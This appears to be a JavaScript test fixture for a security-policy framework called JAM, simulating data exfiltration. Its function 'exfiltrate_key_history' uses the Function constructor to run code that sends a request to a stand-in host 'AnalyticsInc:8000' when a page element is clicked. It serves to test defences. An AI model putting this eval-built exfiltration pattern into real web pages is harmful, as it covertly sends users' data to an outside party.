// exfil_test_func_encodesel.js
function exfiltrate_key_history() {
  JAM.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func_encodesel", true);xmlhttp.send(null);'])();
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

